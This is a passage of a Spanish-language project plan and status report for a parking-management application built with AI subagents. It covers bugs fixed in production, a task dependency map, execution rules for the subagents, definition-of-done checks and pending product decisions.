| T-19, T-20 | subagente J | Vistas de cliente y gestor (+ endpoints *user-scoped*) |
| T-21 | subagente K | Hasta 3 fotos por incidente, con volumen local y validación por bytes |
| T-24 | subagente L | PWA instalable del cliente |
| — | sesión principal | Integración de rutas y menú, y el **fix de la fuga de tickets entre clientes** |

**Bugs de producción encontrados y corregidos** (ninguno estaba en el plan;
todos han salido al ejecutar los criterios de aceptación):

1. **El detector de vehículos no detectaba nada**: la imagen se invertía a RGB
   antes de inferir y Ultralytics la invierte por su cuenta → 0 detecciones
   sobre fotos reales. El servicio respondía `200 []`, indistinguible de "no
   hay coches en la plaza" (T-09).
2. **El stream SSE también bloqueaba el apagado del backend**, igual que el
   MJPEG (T-06+1).
3. **El SSE nunca aceptó el `?token=` que su propio docstring anunciaba**
   (T-17+1).
4. **El CI podía ficar en rojo por un flake**: dos tests de rate-limit
   dejaban la ventana real en 2 s y 10 s, así que el bucket expiraba entre
   peticiones y el 429 no llegaba. Dependía de la carga del equipo.
5. **Siete ficheros de test seguían contra SQLite** aunque la suite corriera
   contra PostgreSQL; al ejecutarlos de verdad apareció un
   `ForeignKeyViolation` que SQLite escondía (SQLite no aplica claves
   foráneas por defecto).
6. **Cerrar el modal de previsualización tumbaba el backend (SIGSEGV)**: el
   `release()` del `VideoCapture` competía con un `grab()` en vuelo en otro
   hilo y OpenCV abortaba el proceso (exit 139). En QA el `--reload` lo
   disimula; en producción el backend caía cada vez que un operador cerraba
   el modal. Lo destapó la prueba de carga (T-13+2).
7. **Cada stream retenía una conexión de PostgreSQL** (`Depends(get_db)` vive
   hasta que termina la respuesta, y en un stream eso es toda su duración):
   con el objetivo de 50 streams el pool se agotaba. También lo destapó la
   prueba de carga (T-13+3).
8. **Un cliente con membresía de sucursal veía los tickets de otros
   clientes**: `GET /api/v1/tickets` acotaba por membresía de sucursal, así
   que cualquier cliente con membresía veía las matrículas, los importes y
   las horas de **todos** los vehículos de esa sucursal. Fuga de datos entre
   clientes (LOPDGDD). El ámbito del cliente pasa a ser sus vehículos.
9. **Cerrar el preview congelaba el backend y bloqueaba la cámara**:
   el teardown del RTSP corría en el hilo del event loop (hasta 5 s con la
   cámara colgada) y el slot de la cámara se liberaba **después** de ese
   teardown, así que reabrirla daba 409. Además, `release()` no identificaba
   la sesión y el `finally` de un generador viejo podía matar el stream de un
   cliente nuevo (T-13+6).

**Lo que queda**: tras esta sesión, el **Bloque 3 está completo** (T-18 a T-21
y T-24, con las decisiones D2/D4/D5 del propio documento aplicadas). Los
únicos criterios sin marcar son **dos de T-02/T-03**, que dependen de que se
arregle la **facturación de la cuenta de GitHub** para que el CI remoto pueda
ejecutar jobs.

Quedan además **dos decisiones de producto** que esta sesión dejó
documentadas y no implementadas, porque son cambios de alcance:

1. **Cobro real** (T-18, T-24): con la decisión D2 el cobro es **contable**,
   sin pasarela. Cuando haya un cliente piloto habrá que añadir el cobro
   real (el punto de enganche son `billing_mode`/`billing_note` de la API de
   planes y la pantalla de pagos).
2. **Traer un usuario ya existente a una sucursal**: es tarea del
   administrador por diseño (un gestor no asigna usuarios a sucursales
   ajenas). El alta de operadores por parte del gestor sí está resuelta
   (T-20), con la API acotada por sucursal.




---

## Mapa de dependencias

```
T-01 (commit) ──┬──> T-02 (CI verde) ──> T-03 (cerrar PRs)
                ├──> T-05 (build de imagen)
                └──> T-04 (tests contra Postgres) ──> T-13 (Locust, necesita SLO real)

T-06 (shutdown MJPEG) ──> T-07 (fps) ──> T-09 (detector validado)
T-08 (audit de login) ──> T-11 (tests de regresión del middleware)
T-10 (registro de streams) ──> T-11

Bloque 2 (roadmap) es independiente del Bloque 0/1, salvo:
T-12 (backups) ──> T-15 (Swarm/K8s: necesita backups antes de HA)
T-16 (exportes) ──> T-18 (planes: los informes del plan salen en el mismo formato)

Bloque 3 (módulos) independiente, salvo:
T-18 (planes) ──> T-19 (Mi plan), T-20 (operadores), T-24 (PWA del cliente)
T-22 (recuperación de contraseña) ──> T-24 (PWA, que necesita self-service)
```

---

## Reglas de ejecución con subagentes (`/goal`)

1. **Un subagente = un `T-xx`** (o un grupo contiguo del mismo bloque y el mismo fichero). Nunca dos agentes editando el mismo fichero a la vez.
2. **Cada subagente empieza leyendo su ítem** en este documento y termina **actualizando la casilla** `[ ]` → `[x]` de sus criterios de aceptación.
3. **El resultado esperado es la definición de "hecho"**: un subagente que no puede verificar sus criterios no da el ítem por terminado; lo deja a medias y lo reporta.
4. **TDD**: todo ítem que toque lógica de backend va con su test en el mismo subagente. Un ítem sin test se considera a medias, salvo que el propio ítem lo excluya explícitamente.
5. **Nada de push a `main`**: los subagentes commitean en la rama de trabajo; el merge lo decide la persona.
6. **Si un ítem revela un ítem nuevo**, se añade al final del bloque correspondiente con id `T-xx+1` y se reporta; no se improvisa fuera del plan.
7. **Los cambios de contrato (API, modelos, rutas)** se documentan en el mensaje del commit y en `docs/CODEMAPS/`.

---

## Definición de "hecho" (global)

> **La puerta que manda mientras el CI remoto no arranque** (facturación):
> `python tools/verificar_repo.py` corre todo lo de esta lista en un
> comando y devuelve 0/1. Con `--completo` añade el CI replicado en local
> y la QA visual en los cinco anchos. Es la red de seguridad del repo
> mientras GitHub no ejecute nada.

- [x] `cd backend && ruff check app tests` → sin errores.
- [x] `cd backend && mypy app` → **sin errores** (modo `strict`). Antes daba 77 y su paso iba con `continue-on-error: true`; ver T-28.
- [x] `docker exec parking-backend-1 pytest -q` → 265 passed, 0 failed (o más, nunca menos). → **652 passed, 9 skipped** en SQLite y **661 passed** en PostgreSQL (las cifras del CI; en el contenedor de desarrollo son **651 passed, 10 skipped** y **660 passed, 1 skipped**, porque allí sólo se monta `backend/` y el test que comprueba la nota del README sobre el reconocimiento facial se salta).
- [x] `docker compose up -d` → todos los servicios *healthy* y `/health` responde 200.
- [x] QA visual en el navegador de las pantallas tocadas (con la app real, no sólo tests).
      → **HECHA** con Chromium headless (Playwright) sobre la app real
      (`frontend/scripts/qa_visual.py`): las **26 pantallas** de los tres
      roles se renderizan, **0 errores de consola** y **0 peticiones de red
      fallidas**. Se revisaron una a una las capturas: catálogo de planes,
      mi plan, mis vehículos, mi perfil, mi plaza, pagos, entradas/salidas,
      alertas, operadores, tickets, mapa, cámaras, vivo y alta manual.
      La QA destapó un defecto visual: el aviso de cobro contable se leía
      "Cobro contable. Cobro contable: ..." (la etiqueta se anteponía a un
      texto que ya empezaba así). Corregido.
      → La QA se ha ampliado desde entonces: recorre además **5 anchos**
      (414, 768, 1024, 1232 y 1440 px) y **detecta el contenido que no cabe**
      (recortado o desbordado), lo que destapó 6 defectos de maquetación
      (T-13+7 y T-13+8) y, al añadir el ancho de móvil, otros 26
      desbordes repartidos en **6 pantallas** —3 de ellas con la página
      entera desplazable— (T-13+9). También hay `frontend/scripts/qa_pwa.py`, que
      verifica que el PWA es instalable y arranca sin red.
- [x] Sin 4xx/5xx inesperados en `docker logs backend` durante la QA.
      → Con el árbol estable el log está limpio. Durante el trabajo en
      paralelo sí hubo errores de arranque del reloader por ficheros a
      medio editar (no de la app).

---

## Decisiones que necesito de ti (bloquean los ítems marcados)

| # | Decisión | Ítems afectados | Mi recomendación |
|---|---|---|---|
| D1 | fps objetivo del preview en vivo | T-07 | 5 fps fijo: ahorra ~85 % de CPU/ancho de banda y la latencia sigue siendo < 400 ms |
| D2 | Números definitivos de los planes y si hay cobro real | T-18 | Mantener los de la memoria (30/60/200 €) y **de momento contable** (sin pasarela) hasta que haya un cliente piloto |
| D3 | Dónde se guardan los backups y quién los vigila | T-12 | S3-compatible cifrado + alerta de antigüedad; el procedimiento de restauración se prueba cada trimestre |
| D4 | ¿PWA o app nativa para el cliente final? | T-24 | PWA: un solo codebase, instalable, sin tiendas |
| D5 | ¿Se exponen las incidencias/fotos en el incidente a un canal externo? | T-21 | No en el MVP: sólo gestor y admin |
| D6 | ¿Los subagentes de la siguiente sesión pueden commitear y pushear a la rama de trabajo? | todos | Commitean a la rama; el push y el merge los hace una persona |

---

## Anexo — Evidencia recogida el 2026-10-21

- **Stack**: `parking` (db postgis:16-3.4, redis:7, backend, frontend, celery-worker) + `parking-mediamtx` + `parking-rtsp-push` (RTSP de prueba) + `parking-mediamtx-qa`.
- **Prueba de live preview**: cámara id=81 apuntando a `rtsp://parking-mediamtx:8554/cam1`; primer frame a 1,85 s; 35 fps; 1,2 MB/s; captura a canvas → data URL de 37 KB; detección de vehículos fail-open (200 con `[]` con el detector caído).
- **Pruebas**: 265 passed / 0 failed (final), 48 failed / 217 passed (antes de arreglar el middleware).
- **CI**: PR #14 → Backend FAIL / Frontend OK; PR #13 → todo OK; `main` → verde. La serie de runs muestra el primer rojo en `007c8ad` (commit del vehicle-detector, que introdujo los `F401`).
- **Auth en vivo**: login 200 · `bearer` en minúsculas 200 · logout 200 · token reutilizado → 401 · `Bearer` malformado → 401 (nunca 500) · sin header → 401 · auditoría `logout_success` con `user_id=1`.
- **Caché de la QA**: `mediamtx` construido localmente en `C:/Users/catvi/AppData/Local/Temp/mediamtx-build/` (fuera del repo); la imagen `parking-mediamtx:qa` y los contenedores de prueba **no** forman parte del repo.
